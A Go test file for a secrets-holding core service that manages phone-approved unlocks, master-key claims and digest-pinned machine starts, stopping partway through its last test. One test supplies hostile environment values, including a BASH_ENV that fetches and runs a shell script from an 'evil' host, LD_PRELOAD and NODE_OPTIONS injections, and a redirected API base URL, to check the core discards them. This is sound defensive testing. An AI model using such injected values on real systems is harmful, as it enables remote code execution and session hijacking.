package main

import (
	"bytes"
	"crypto/ecdh"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"net/http/httptest"
	"os"
	"sort"
	"strings"
	"testing"
	"time"
)

// the core's diagnostics (stdout in production) stay out of test output
func TestMain(m *testing.M) {
	log.SetOutput(io.Discard)
	os.Exit(m.Run())
}

// ---- fakes -------------------------------------------------------------------------------------

type fakeMachine struct {
	enc, sig  *ecdh.PrivateKey
	image     string
	state     string
	destroyed bool
	inited    bool
}

type fakeFly struct {
	n        int
	machines map[string]*fakeMachine
	token    string
	env      map[string]string // the last created machine's env
	guest    map[string]any    // and its guest
	failInit bool
	booting  bool   // new machines stay "starting" until told otherwise
	slowKill bool   // a destroy leaves the machine "destroying" (Fly confirms later)
	swap     string // report this digest instead of the requested one (a registry serving other bytes)
}

func newFakeFly() *fakeFly { return &fakeFly{machines: map[string]*fakeMachine{}} }

func (f *fakeFly) Configure(token string) { f.token = token }
func (f *fakeFly) Create(r StartRequest, guest map[string]any, env map[string]string) (string, error) {
	f.n++
	id := fmt.Sprintf("m%d", f.n)
	e, _ := ecdh.P256().GenerateKey(rand.Reader)
	s, _ := ecdh.P256().GenerateKey(rand.Reader)
	ref, digest, _ := strings.Cut(r.Image, "@")
	if f.swap != "" {
		digest = f.swap
	}
	if i := strings.LastIndex(ref, ":"); i > strings.LastIndex(ref, "/") {
		ref = ref[:i] // Fly reports registry/repository@digest
	}
	state := "started"
	if f.booting {
		state = "starting"
	}
	f.machines[id] = &fakeMachine{enc: e, sig: s, image: ref + "@" + digest, state: state}
	f.env, f.guest = env, guest
	return id, nil
}
func (f *fakeFly) Inspect(id string) (FlyMachine, error) {
	m, ok := f.machines[id]
	if !ok {
		return FlyMachine{}, fmt.Errorf("not found")
	}
	return FlyMachine{State: m.state, Image: m.image}, nil
}
func (f *fakeFly) Init(id string) (MachineKeys, error) {
	if f.failInit {
		return MachineKeys{}, fmt.Errorf("exec failed")
	}
	m := f.machines[id]
	m.inited = true
	return MachineKeys{b64.EncodeToString(m.enc.PublicKey().Bytes()), b64.EncodeToString(m.sig.PublicKey().Bytes())}, nil
}
func (f *fakeFly) Destroy(id string) error {
	m, ok := f.machines[id]
	if !ok {
		return fmt.Errorf("not found")
	}
	m.destroyed = true
	m.state = "destroyed"
	if f.slowKill {
		m.state = "destroying"
	}
	return nil
}

// a P-256 key holder: the iPhone (signing + the Enclave's key agreement, here in software), the master key,
// the setup key
type phone struct {
	sig *ecdsa.PrivateKey
	agr *ecdh.PrivateKey
}

func newPhone() *phone {
	s, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	a, _ := ecdh.P256().GenerateKey(rand.Reader)
	return &phone{s, a}
}
func (p *phone) signingKey() string {
	k, _ := p.sig.PublicKey.ECDH()
	return b64.EncodeToString(k.Bytes())
}
func (p *phone) agreementKey() string { return b64.EncodeToString(p.agr.PublicKey().Bytes()) }
func (p *phone) sign(payload string) string {
	h := sha256.Sum256([]byte(payload))
	s, _ := ecdsa.SignASN1(rand.Reader, p.sig, h[:])
	return b64.EncodeToString(s)
}

// the phone's share of an unlock: x(p·E), sealed to the core's one-off key T (what the shell does)
func (p *phone) share(begin SignedDoc) (string, map[string]Sealed) {
	var b struct {
		Pending, T string
		Keys       []struct{ Key, E string }
	}
	json.Unmarshal([]byte(begin.Payload), &b)
	out := map[string]Sealed{}
	for _, k := range b.Keys {
		out[k.Key] = p.shareOf(k.E, b.T)
	}
	return b.Pending, out
}

// shareOf: the phone's x(p·E), sealed to the one-off T
func (p *phone) shareOf(e, t string) Sealed {
	eb, _ := b64.DecodeString(e)
	E, _ := ecdh.P256().NewPublicKey(eb)
	x, _ := p.agr.ECDH(E) // the Enclave returns only x
	s, _ := SealTo(t, x, infoShare)
	return s
}

// pl(t)(c.Primitive(...)): the answer's payload, failing the test on an error
func pl(t *testing.T) func(SignedDoc, error) map[string]any {
	return func(d SignedDoc, err error) map[string]any {
		t.Helper()
		if err != nil {
			t.Fatal(err)
		}
		var m map[string]any
		json.Unmarshal([]byte(d.Payload), &m)
		return m
	}
}

const img = "ghcr.io/de0ch/jarvis4-session:1@sha256:1111111111111111111111111111111111111111111111111111111111111111"

var testValues = map[string]map[string]string{
	"default":    {"A": "1", "B": "2"},
	"gmail":      {"G": "secret"},
	"claude":     {"CLAUDE_CREDENTIALS": "c"},
	"openrouter": {"OPENROUTER_API": "o"},
}

// sealKey: what a writer does OUTSIDE the core — one key's value under a fresh data key, that key wrapped to the
// combined key P + K
func sealKey(t *testing.T, c *Core, p *phone, store, key, value string) KeyEntry {
	t.Helper()
	dk := make([]byte, 32)
	rand.Read(dk)
	w, err := WrapToCombined(p.agreementKey(), c.agreement.PublicKey().Bytes(), dk)
	if err != nil {
		t.Fatal(err)
	}
	return KeyEntry{Store: store, Key: key, Wrapped: w, Data: b64.EncodeToString(gcmSeal(dk, []byte(value), KeyAAD(store, key)))}
}

// setupWrite: one key written as the setup session (its signature is only passed on: the phone checks it)
func setupWrite(c *Core, x KeyEntry) (SignedDoc, error) {
	return c.WriteKey(WriteKeyInput{Store: x.Store, Key: x.Key, Wrapped: x.Wrapped, Data: x.Data, Writer: "setup", Sig: "c2ln"})
}

// writeStore: every key of vals written as the setup session; the last write's answer (or the first refusal)
func writeStore(t *testing.T, c *Core, p *phone, name string, vals map[string]string) (SignedDoc, error) {
	t.Helper()
	var d SignedDoc
	for _, k := range sortedKeys(vals) {
		var err error
		if d, err = setupWrite(c, sealKey(t, c, p, name, k, vals[k])); err != nil {
			return d, err
		}
	}
	return d, nil
}

// ---- the writer's side (the app's CoreCrypto.wrapStore, the router's store API): the core itself never wraps ----

// WrapToCombined: a fresh e; secret = e·(P+K)
func WrapToCombined(phoneAgreementRaw string, coreAgreementPub []byte, dataKey []byte) (WrappedKey, error) {
	pb, err := b64.DecodeString(phoneAgreementRaw)
	if err != nil {
		return WrappedKey{}, err
	}
	combined, err := AddPoints(pb, coreAgreementPub)
	if err != nil {
		return WrappedKey{}, err
	}
	return WrapToPoint(combined, dataKey)
}

// WrapToPoint: the data key wrapped to a store key C = P + K (what a writer without point addition gets from the
// core's signed store_key): a one-off e, HKDF(x(e·C), "jarvis2/store-data-key"), AES-GCM
func WrapToPoint(combined, dataKey []byte) (WrappedKey, error) {
	e, err := ecdh.P256().GenerateKey(rand.Reader)
	if err != nil {
		return WrappedKey{}, err
	}
	shared, err := ScalarMult(e.Bytes(), combined)
	if err != nil {
		return WrappedKey{}, err
	}
	return WrappedKey{E: b64.EncodeToString(e.PublicKey().Bytes()), Wrapped: b64.EncodeToString(gcmSeal(kdf(xOf(shared), infoStore), dataKey, nil))}, nil
}

// appWrap: a store's keys as the app wraps them, to the store key the core signed for this phone (store_key)
func appWrap(t *testing.T, c *Core, p *phone, name string, vals map[string]string) []KeyEntry {
	t.Helper()
	sk := pl(t)(c.StoreKey(p.agreementKey(), ""))
	C, _ := b64.DecodeString(sk["storeKey"].(string))
	out := []KeyEntry{}
	for _, k := range sortedKeys(vals) {
		dk := make([]byte, 32)
		rand.Read(dk)
		w, err := WrapToPoint(C, dk)
		if err != nil {
			t.Fatal(err)
		}
		out = append(out, KeyEntry{Store: name, Key: k, Wrapped: w, Data: b64.EncodeToString(gcmSeal(dk, []byte(vals[k]), KeyAAD(name, k)))})
	}
	return out
}

const testMachineURL = "http://jarvis2-test._peer.internal:8081"

func newCore(t *testing.T) (*Core, *fakeFly, *phone) {
	t.Helper()
	t.Setenv("MACHINE_URL", testMachineURL)
	f := newFakeFly()
	c, err := NewCore(f)
	if err != nil {
		t.Fatal(err)
	}
	return c, f, newPhone() // the master key: the app makes it at Reset, or takes it from the kit at Recover
}

// claimFor: what the iPhone sends to set up an empty core — a statement naming the master key, the core and
// the phone, signed by that master key, and the bundle sealed to the core (Recover: the stores from the
// backups, the Fly store among them; Reset: no stores at all)
func claimFor(c *Core, master, p *phone, rb any) (string, string, Sealed) {
	plain, _ := json.Marshal(rb)
	sum := sha256.Sum256(plain)
	var st claimStatement
	st.Kind, st.Master = "claim", master.signingKey()
	k := c.Key()
	st.Core.SigningKey, st.Core.AgreementKey = k["signingKey"], k["agreementKey"]
	st.Phone.SigningKey, st.Phone.AgreementKey = p.signingKey(), p.agreementKey()
	st.BundleSha256 = hex.EncodeToString(sum[:])
	sb, _ := json.Marshal(st)
	bundle, _ := SealTo(k["agreementKey"], plain, infoClaim)
	return string(sb), master.sign(string(sb)), bundle
}

// recoverBundle: the app's Recover bundle — every test store wrapped to the store key, and the Fly token
func recoverBundle(t *testing.T, c *Core, p *phone, flyToken string) claimBundle {
	t.Helper()
	rb := claimBundle{Format: "keys", NotSensitive: []string{"default", "claude", "openrouter"}, FlyToken: flyToken}
	for _, n := range []string{"claude", "default", "gmail", "openrouter"} {
		rb.Stores = append(rb.Stores, n)
		rb.Keys = append(rb.Keys, appWrap(t, c, p, n, testValues[n])...)
	}
	return rb
}

// resetBundle: a Reset's bundle, no stores
var resetBundle = claimBundle{Format: "keys"}

func setup(t *testing.T) (*Core, *fakeFly, *phone) {
	t.Helper()
	c, f, master := newCore(t)
	p := newPhone()
	s, sig, b := claimFor(c, master, p, recoverBundle(t, c, p, "fly-secret"))
	pl(t)(c.Claim(s, sig, b))
	return c, f, p
}

// unlock: a standing unlock (the Stores page): open to every session until locked
func unlock(t *testing.T, c *Core, p *phone, store string) string {
	t.Helper()
	return unlockFor(t, c, p, store, "")
}

// unlockFor: an unlock for the one challenge or cert with this nonce ("" = standing)
func unlockFor(t *testing.T, c *Core, p *phone, store, forNonce string) string {
	t.Helper()
	b, err := c.UnlockBegin(store, forNonce)
	if err != nil {
		t.Fatal(err)
	}
	id, s := p.share(b)
	m := pl(t)(c.UnlockFinish(id, s))
	return m["id"].(string)
}

// approve: the iPhone answers a succession challenge
func approve(t *testing.T, c *Core, p *phone, in SuccessionInput) SignedDoc {
	t.Helper()
	ch, err := routerSuccession(c, in)
	if err != nil {
		t.Fatal(err)
	}
	a, err := c.ApproveByPhone(&ch, p.sign(ch.Payload), "", nil)
	if err != nil {
		t.Fatal(err)
	}
	return a
}

// tryStart: what the router does with an approval — start a machine on the approved image, then certify it
func tryStart(c *Core, a SignedDoc) (SignedDoc, error) { return tryStartCarry(c, a, "") }

// tryStartCarry: the same, certifying with the line's carry blob (answered rebound beside the cert)
func tryStartCarry(c *Core, a SignedDoc, carry string) (SignedDoc, error) {
	var ap Approval
	json.Unmarshal([]byte(a.Payload), &ap)
	if ap.Request.Image == NullImage {
		return c.Certify(&a, nil, "")
	}
	st, err := startMachine(c, ap.Request.Image)
	if err != nil {
		return SignedDoc{}, err
	}
	return c.Certify(&a, &st, carry)
}

// startMachine: what the router does to start one — create, then init (the fake is up at once)
func startMachine(c *Core, image string) (SignedDoc, error) {
	cr, err := c.Start(StartRequest{Image: image, Size: "medium"})
	if err != nil {
		return SignedDoc{}, err
	}
	var x struct{ ID string }
	json.Unmarshal([]byte(cr.Payload), &x)
	return c.Init(x.ID)
}

func start(t *testing.T, c *Core, a SignedDoc) (SignedDoc, string) {
	t.Helper()
	return startCarry(t, c, a, "")
}

func startCarry(t *testing.T, c *Core, a SignedDoc, carry string) (SignedDoc, string) {
	t.Helper()
	cert, err := tryStartCarry(c, a, carry)
	if err != nil {
		t.Fatal(err)
	}
	var cc Cert
	json.Unmarshal([]byte(cert.Payload), &cc)
	return cert, cc.Machine.ID
}

func newLine(t *testing.T, c *Core, p *phone, stores ...string) (SignedDoc, string) {
	t.Helper()
	return start(t, c, approve(t, c, p, SuccessionInput{Image: img, Stores: stores}))
}

// ---- tests ---------------------------------------------------------------------------------------

func TestEverythingLeavingIsSignedByTheCore(t *testing.T) {
	c, _, _ := setup(t)
	d, err := c.ListUnlocked("n1")
	if err != nil {
		t.Fatal(err)
	}
	if !VerifyWith(c.Key()["signingKey"], []byte(d.Payload), d.Sig) {
		t.Fatal("list_unlocked answer not signed by the core")
	}
	if !strings.Contains(d.Payload, `"nonce":"n1"`) {
		t.Fatal("nonce missing: " + d.Payload)
	}
}

func TestRecoverOnceOnlyOnAnEmptyCore(t *testing.T) {
	c, f, master := newCore(t)
	p := newPhone()
	s, sig, b := claimFor(c, master, p, recoverBundle(t, c, p, "fly-secret"))
	if _, err := c.Claim(s, newPhone().sign(s), b); err == nil {
		t.Fatal("claimed with a signature by another key than the master key it names")
	}
	other, _, _ := newCore(t)
	s2, sig2, b2 := claimFor(other, master, p, recoverBundle(t, other, p, "fly-secret"))
	if _, err := c.Claim(s2, sig2, b2); err == nil {
		t.Fatal("claimed with a statement naming another core")
	}
	_, _, b3 := claimFor(c, master, p, recoverBundle(t, c, p, "another"))
	if _, err := c.Claim(s, sig, b3); err == nil {
		t.Fatal("claimed with a bundle the master didn't sign")
	}
	// the older plaintext form (stores with their values) is refused, signed or not
	plain := map[string]any{"stores": []map[string]any{{"name": "default", "values": testValues["default"]}}, "notSensitive": []string{}}
	s5, sig5, b5 := claimFor(c, master, p, plain)
	if _, err := c.Claim(s5, sig5, b5); err == nil || err.(*Err).Status != 400 || !strings.Contains(err.Error(), "bad bundle") {
		t.Fatal("took a plaintext bundle:", err)
	}
	if _, err := c.SetFlyToken(Sealed{}); err == nil {
		t.Fatal("an empty core took a Fly token")
	}
	pl(t)(c.Claim(s, sig, b))
	if f.token != "fly-secret" {
		t.Fatal("the core store's Fly token wasn't taken")
	}
	if c.MasterKey != master.signingKey() {
		t.Fatal("the core doesn't hold the master key it was claimed with")
	}
	// a second claim, even by the same master key, or a Reset with a new one: refused
	if _, err := c.Claim(s, sig, b); err == nil {
		t.Fatal("claimed twice")
	}
	m2 := newPhone()
	s4, sig4, b4 := claimFor(c, m2, p, resetBundle)
	if _, err := c.Claim(s4, sig4, b4); err == nil {
		t.Fatal("a set-up core took a new master key")
	}
	if len(c.unlocked) != 0 {
		t.Fatal("the claim left plaintext in memory")
	}
	if _, ok := c.stores[FlyStore]; ok {
		t.Fatal("the Fly store is kept as a session store")
	}
	var l struct {
		Stores []struct {
			Name                       string
			Sensitive, Empty, Unlocked bool
			Keys                       []struct{ Name string }
		}
	}
	json.Unmarshal([]byte(pl2(t)(c.Stores("n")).Payload), &l)
	got := []string{}
	for _, r := range l.Stores {
		keys := []string{}
		for _, k := range r.Keys {
			keys = append(keys, k.Name)
		}
		got = append(got, fmt.Sprint(r.Name, r.Sensitive, r.Empty, r.Unlocked, keys))
	}
	if fmt.Sprint(got) != "[claudefalse false false [CLAUDE_CREDENTIALS] defaultfalse false false [A B] gmailtrue false false [G] openrouterfalse false false [OPENROUTER_API]]" {
		t.Fatalf("got %v", got)
	}
}

func TestResetStartsEmptyAndTakesTheFlyTokenSealed(t *testing.T) {
	c, f, master := newCore(t)
	p := newPhone()
	id := func() (string, map[string]any) {
		x, err := c.Identity()
		if err != nil {
			t.Fatal(err)
		}
		d := x["state"].(SignedDoc)
		if !VerifyWith(c.Key()["signingKey"], []byte(d.Payload), d.Sig) {
			t.Fatal("the core's state isn't signed by the core")
		}
		var st map[string]any
		json.Unmarshal([]byte(d.Payload), &st)
		return st["master"].(string), st
	}
	if m, _ := id(); m != "" {
		t.Fatal("a new core isn't empty")
	}
	s, sig, b := claimFor(c, master, p, resetBundle)
	pl(t)(c.Claim(s, sig, b))
	if m, st := id(); m != master.signingKey() || st["phone"].(map[string]any)["signingKey"] != p.signingKey() {
		t.Fatalf("the state doesn't name the master key and the phone: %v", st)
	}
	if l := pl(t)(c.Stores("n")); fmt.Sprint(l["stores"]) != "[]" {
		t.Fatalf("a Reset core has stores: %v", l["stores"])
	}
	if _, err := c.Start(StartRequest{Image: img, Size: "small"}); err == nil && f.token != "" {
		t.Fatal("a token out of nowhere")
	}
	seal := func(info string) Sealed {
		x, _ := SealTo(c.Key()["agreementKey"], []byte(`{"FLY_API_TOKEN":"tok"}`), info)
		return x
	}
	if _, err := c.SetFlyToken(seal(infoShare)); err == nil {
		t.Fatal("took a token sealed for another purpose")
	}
	pl(t)(c.SetFlyToken(seal(infoFlyToken)))
	if f.token != "tok" {
		t.Fatal("the Fly token wasn't set")
	}
}

func TestWipeOnlyByTheCurrentMasterKey(t *testing.T) {
	c, _, master := newCore(t)
	exited := make(chan bool, 1)
	c.exit = func() { exited <- true }
	stmt := func(core string) string {
		b, _ := json.Marshal(map[string]string{"kind": "wipe", "core": core})
		return string(b)
	}
	w := stmt(c.Key()["signingKey"])
	// an empty core: already what a wipe makes, answered, nothing ends
	if d := pl(t)(c.Wipe(w, master.sign(w))); d["alreadyEmpty"] != true || len(exited) != 0 {
		t.Fatalf("an empty core's wipe: %v", d)
	}
	p := newPhone()
	s, sig, b := claimFor(c, master, p, resetBundle)
	pl(t)(c.Claim(s, sig, b))
	if _, err := c.Wipe(w, newPhone().sign(w)); err == nil {
		t.Fatal("wiped with another key")
	}
	if _, err := c.Wipe(w, p.sign(w)); err == nil {
		t.Fatal("wiped with the phone's key (only the master key ends a core)")
	}
	o := stmt(newPhone().signingKey())
	if _, err := c.Wipe(o, master.sign(o)); err == nil {
		t.Fatal("wiped with a statement naming another core")
	}
	select {
	case <-exited:
		t.Fatal("exited on a refused wipe")
	default:
	}
	if m := pl(t)(c.Wipe(w, master.sign(w))); m["kind"] != "wiping" {
		t.Fatalf("got %v", m)
	}
	select {
	case <-exited:
	case <-time.After(2 * time.Second):
		t.Fatal("the core didn't end")
	}
}

func TestMachinesGetTheCoreKeyFromTheCore(t *testing.T) {
	c, f, p := setup(t)
	newLine(t, c, p, "default")
	if f.env[coreKeyEnv] != c.Key()["signingKey"] {
		t.Fatal("the machine wasn't given the core's key")
	}
	// the router can't plant another one, nor anything else: the core sets the whole env
	evil := map[string]string{coreKeyEnv: "evil", "X": "1", "LD_PRELOAD": "/tmp/x.so", "BASH_ENV": "$(curl evil|sh)",
		"NODE_OPTIONS": "--require /tmp/x.js", "PATH": "/tmp", "JARVIS2_URL": "http://evil", "ANTHROPIC_BASE_URL": "http://evil",
		"JARVIS2_ROLLBACK": "x", "JARVIS2_RESTORE_CERT": "{}", "SESSION_PROMPT": "do evil", "SESSION_REPOS": "https://github.com/evil/x"}
	body, _ := json.Marshal(map[string]any{"image": img, "size": "small", "env": evil})
	srv := httptest.NewServer(Handler(c))
	defer srv.Close()
	resp, err := http.Post(srv.URL+"/start", "application/json", bytes.NewReader(body))
	if err != nil || resp.StatusCode != 200 {
		t.Fatalf("start: %v %v", err, resp)
	}
	want := map[string]string{coreKeyEnv: c.Key()["signingKey"], machineURLEnv: testMachineURL}
	if len(f.env) != len(want) || f.env[coreKeyEnv] != want[coreKeyEnv] || f.env[machineURLEnv] != want[machineURLEnv] {
		t.Fatalf("got %v", f.env)
	}
}

func TestNewSessionUnlockAndPullSecrets(t *testing.T) {
	c, f, p := setup(t)
	cert, id := newLine(t, c, p, "claude", "default", "gmail")
	m := f.machines[id]
	if !m.inited {
		t.Fatal("the machine wasn't inited through Fly")
	}
	if _, err := c.PullSecrets(&cert, ""); err == nil {
		t.Fatal("pulled while locked")
	}
	unlock(t, c, p, "default")
	unlock(t, c, p, "gmail")
	unlock(t, c, p, "claude")
	d, err := c.PullSecrets(&cert, "")
	if err != nil {
		t.Fatal(err)
	}
	var out struct{ Sealed Sealed }
	json.Unmarshal([]byte(d.Payload), &out)
	plain, err := OpenSealed(m.enc, out.Sealed, "jarvis2/secrets")
	if err != nil {
		t.Fatal(err)
	}
	var vals map[string]string
	json.Unmarshal(plain, &vals)
	if vals["A"] != "1" || vals["G"] != "secret" || vals["CLAUDE_CREDENTIALS"] != "c" {
		t.Fatalf("got %v", vals)
	}
}

func TestAWrongPhoneShareDoesntUnlock(t *testing.T) {
	c, _, _ := setup(t)
	other := newPhone()
	b, _ := c.UnlockBegin("default", "")
	id, s := other.share(b)
	if _, err := c.UnlockFinish(id, s); err == nil {
		t.Fatal("another phone's share unlocked the store")
	}
	// a key moved outside the core to another store, or renamed, doesn't decrypt
	for _, to := range [][2]string{{"gmail", "A"}, {"default", "B"}} {
		c2, _, p2 := setup(t)
		x := sealKey(t, c2, p2, "default", "A", "1")
		x.Store, x.Key = to[0], to[1]
		pl(t)(setupWrite(c2, x))
		b2, _ := c2.UnlockBegin(to[0], "")
		id2, s2 := p2.share(b2)
		if _, err := c2.UnlockFinish(id2, s2); err == nil {
			t.Fatalf("a key moved to %v unlocked", to)
		}
	}
	if _, err := c.UnlockFinish(id, s); err == nil {
		t.Fatal("a pending unlock was usable twice")
	}
}

func TestLockWipesWhenTheLastIDGoes(t *testing.T) {
	c, _, p := setup(t)
	a, b := unlock(t, c, p, "default"), unlock(t, c, p, "default")
	c.Lock(a)
	if _, ok := c.unlocked["default"]; !ok {
		t.Fatal("wiped with an id still open")
	}
	c.Lock(b)
	if _, ok := c.unlocked["default"]; ok {
		t.Fatal("plaintext kept after the last lock")
	}
	l := pl(t)(c.ListUnlocked("n"))
	if len(l["unlocked"].([]any)) != 0 {
		t.Fatal("list_unlocked not empty")
	}
}

func TestPhoneSignatureMustCoverExactlyTheChallenge(t *testing.T) {
	c, _, p := setup(t)
	ch, _ := routerSuccession(c, SuccessionInput{Image: img, Stores: []string{"default"}})
	if _, err := c.ApproveByPhone(&ch, p.sign("something else"), "", nil); err == nil {
		t.Fatal("accepted a signature over something else")
	}
	altered := SignedDoc{Payload: strings.Replace(ch.Payload, "default", "gmail", 1), Sig: ch.Sig}
	if _, err := c.ApproveByPhone(&altered, p.sign(altered.Payload), "", nil); err == nil {
		t.Fatal("accepted an altered challenge")
	}
	if _, err := c.ApproveByPhone(&ch, newPhone().sign(ch.Payload), "", nil); err == nil {
		t.Fatal("accepted another phone")
	}
	if _, err := c.ApproveByDeadMachine(&ch); err == nil {
		t.Fatal("a new line was answered without the phone")
	}
}

func TestAnApprovalMakesOneMachine(t *testing.T) {
	c, f, p := setup(t)
	a := approve(t, c, p, SuccessionInput{Image: img, Stores: []string{"default"}})
	// the core makes one try at reading the keys; a machine whose init fails isn't started, and the router kills it
	f.failInit = true
	cr := pl(t)(c.Start(StartRequest{Image: img, Size: "small"}))
	if cr["kind"] != "created" || cr["id"] != "m1" {
		t.Fatalf("start: %v", cr)
	}
	if _, err := c.Init("m1"); err == nil {
		t.Fatal("started without the machine's keys")
	}
	pl(t)(c.KillWithSnapshot("m1", nil))
	f.failInit = false
	if _, err := c.Init("m1"); err == nil {
		t.Fatal("initialised a killed machine")
	}
	if _, err := c.Init("ghost"); err == nil {
		t.Fatal("initialised a machine this core didn't create")
	}
	for _, bad := range []string{"ghcr.io/de0ch/other:1", "ghcr.io/de0ch/other@sha256:" + strings.Repeat("1", 64),
		"ghcr.io/de0ch/jarvis4-session:1", "ghcr.io/de0ch/jarvis4-session:latest", "evil.io/de0ch/jarvis4-session@sha256:" + strings.Repeat("1", 64)} {
		if _, err := c.Start(StartRequest{Image: bad, Size: "small"}); err == nil {
			t.Fatalf("started %s (another repository, or not pinned by digest)", bad)
		}
	}
	other, err := startMachine(c, "ghcr.io/de0ch/jarvis4-session:3@sha256:"+strings.Repeat("3", 64))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := c.Certify(&a, &other, ""); err == nil {
		t.Fatal("certified a machine running another image")
	}
	mine, err := startMachine(c, img)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := c.Init(machineOf(mine)); err == nil {
		t.Fatal("initialised a machine twice")
	}
	pl(t)(c.Certify(&a, &mine, ""))
	if _, err := tryStart(c, a); err == nil {
		t.Fatal("one approval made two machines")
	}
	b := approve(t, c, p, SuccessionInput{Image: img, Stores: []string{"gmail"}})
	if _, err := c.Certify(&b, &mine, ""); err == nil {
		t.Fatal("one machine got two lines")
	}
	forgedStart := SignedDoc{Payload: other.Payload, Sig: mine.Sig}
	if _, err := c.Certify(&b, &forgedStart, ""); err == nil {
		t.Fatal("certified a started document the core didn't sign")
	}
	forged := SignedDoc{Payload: a.Payload, Sig: newPhone().sign(a.Payload)}
	if _, err := tryStart(c, forged); err == nil {
		t.Fatal("certified with an approval the core didn't sign")
	}
}

func TestResumeByDeadMachineExactlyOnce(t *testing.T) {
	c, f, p := setup(t)
	cert, old := newLine(t, c, p, "default")
	image := f.machines // keep vet quiet about f
	_ = image
	var oc Cert
	json.Unmarshal([]byte(cert.Payload), &oc)
	in := SuccessionInput{Predecessor: &cert, Image: oc.Machine.Image, Stores: []string{"default"}}
	ch, _ := routerSuccession(c, in)
	if _, err := c.ApproveByDeadMachine(&ch); err == nil {
		t.Fatal("resumed from a live machine")
	}
	if _, err := c.KillWithSnapshot(old, nil); err != nil {
		t.Fatal(err)
	}
	a := pl(t)(c.ApproveByDeadMachine(&ch))
	if a["kind"] != "approval" || a["by"] != "dead-machine" {
		t.Fatalf("got %v", a)
	}
	ad, _ := c.ApproveByDeadMachine(&ch)
	start(t, c, ad)
	// the same predecessor can't have a second successor (no fork), even if killed again
	c.KillWithSnapshot(old, nil)
	ch2, _ := routerSuccession(c, in)
	if _, err := c.ApproveByDeadMachine(&ch2); err == nil {
		t.Fatal("forked: a used predecessor got a second approval")
	}
	ad2, _ := c.ApproveByPhone(&ch2, p.sign(ch2.Payload), "", nil)
	if _, err := tryStart(c, ad2); err == nil {
		t.Fatal("forked: a used predecessor got a second machine")
	}
}

func TestApproveByDeadMachineRefusesChanges(t *testing.T) {
	c, _, p := setup(t)
	cert, old := newLine(t, c, p, "default")
	var oc Cert
	json.Unmarshal([]byte(cert.Payload), &oc)
	c.KillWithSnapshot(old, nil)
	for _, in := range []SuccessionInput{
		{Predecessor: &cert, Image: oc.Machine.Image, Stores: []string{"default", "gmail"}},
		{Predecessor: &cert, Image: oc.Machine.Image, Stores: []string{"default"}, Options: Options{Harness: "opencode"}},
		{Predecessor: &cert, Image: "ghcr.io/de0ch/jarvis4-session:2@sha256:2222222222222222222222222222222222222222222222222222222222222222", Stores: []string{"default"}},
	} {
		ch, _ := routerSuccession(c, in)
		if _, err := c.ApproveByDeadMachine(&ch); err == nil {
			t.Fatalf("changed %+v without the phone", in)
		}
	}
}

func TestUpgradeIsApprovedBeforeTheOldMachineGoes(t *testing.T) {
	c, _, p := setup(t)
	cert, old := newLine(t, c, p, "default")
	// the iPhone approves the new image before the old machine is killed
	a := approve(t, c, p, SuccessionInput{Predecessor: &cert, Image: "ghcr.io/de0ch/jarvis4-session:2@sha256:2222222222222222222222222222222222222222222222222222222222222222", Stores: []string{"default"}})
	if _, err := tryStart(c, a); err == nil {
		t.Fatal("started a successor while the predecessor runs")
	}
	c.KillWithSnapshot(old, nil)
	start(t, c, a)
	a2 := approve(t, c, p, SuccessionInput{Predecessor: &cert, Image: "ghcr.io/de0ch/jarvis4-session:2@sha256:2222222222222222222222222222222222222222222222222222222222222222", Stores: []string{"default"}})
	if _, err := tryStart(c, a2); err == nil {
		t.Fatal("a used predecessor got a second successor")
	}
}

func TestBurnIsASuccessionToTheNullImage(t *testing.T) {
	c, _, p := setup(t)
	cert, old := newLine(t, c, p, "default")
	burn := SuccessionInput{Predecessor: &cert, Image: NullImage}
	for _, bad := range []SuccessionInput{
		{Image: NullImage},
		{Predecessor: &cert, Image: NullImage, Stores: []string{"default"}},
		{Predecessor: &cert, Image: NullImage, Options: Options{Harness: "claude"}},
	} {
		if _, err := routerSuccession(c, bad); err == nil {
			t.Fatalf("accepted a burn with %+v", bad)
		}
	}
	ch, _ := routerSuccession(c, burn)
	if _, err := c.ApproveByDeadMachine(&ch); err == nil {
		t.Fatal("burned a live machine")
	}
	c.KillWithSnapshot(old, nil)
	a, err := c.ApproveByDeadMachine(&ch)
	if err != nil {
		t.Fatal(err)
	}
	b := pl(t)(tryStart(c, a))
	if b["kind"] != "burn-cert" || b["predecessorId"] != old {
		t.Fatalf("got %v", b)
	}
	var oc Cert
	json.Unmarshal([]byte(cert.Payload), &oc)
	ch2, _ := routerSuccession(c, SuccessionInput{Predecessor: &cert, Image: oc.Machine.Image, Stores: []string{"default"}})
	if _, err := c.ApproveByDeadMachine(&ch2); err == nil {
		t.Fatal("a burnt machine resumed")
	}
	a2 := approve(t, c, p, SuccessionInput{Predecessor: &cert, Image: img, Stores: []string{"default"}})
	if _, err := tryStart(c, a2); err == nil {
		t.Fatal("a burnt machine got a successor")
	}
}

func TestKillRejectsNullAndUnconfirmed(t *testing.T) {
	c, _, _ := setup(t)
	if _, err := c.KillWithSnapshot("null", nil); err == nil {
		t.Fatal("killed null")
	}
	if _, err := c.KillWithSnapshot("ghost", nil); err == nil {
		t.Fatal("a machine Fly doesn't know counted as killed")
	}
}

func TestAddAStoreToARunningSession(t *testing.T) {
	c, f, p := setup(t)
	cert, id := newLine(t, c, p, "default")
	set := []string{"default", "gmail"}
	// succession(machine → same machine, old set + one): only the iPhone answers it, and it is a cert at once
	ch := pl(t)(routerSuccession(c, SuccessionInput{Predecessor: &cert, Machine: id, Stores: set}))
	if ch["request"].(map[string]any)["addedStore"] != "gmail" {
		t.Fatal("challenge doesn't name the added store")
	}
	chd, _ := routerSuccession(c, SuccessionInput{Predecessor: &cert, Machine: id, Stores: set})
	if _, err := c.ApproveByDeadMachine(&chd); err == nil {
		t.Fatal("approve_by_dead_machine added a store")
	}
	c2, err := c.ApproveByPhone(&chd, p.sign(chd.Payload), "", &cert)
	cert2 := pl(t)(c2, err)
	if cert2["kind"] != "succession-cert" || cert2["machine"].(map[string]any)["id"] != id {
		t.Fatalf("got %v", cert2)
	}
	// once: the same challenge and signature answered again gets nothing (the cert it continues is superseded)
	if _, err := c.ApproveByPhone(&chd, p.sign(chd.Payload), "", nil); err == nil {
		t.Fatal("an add-store approval was answered twice")
	}
	unlock(t, c, p, "default")
	unlock(t, c, p, "gmail")
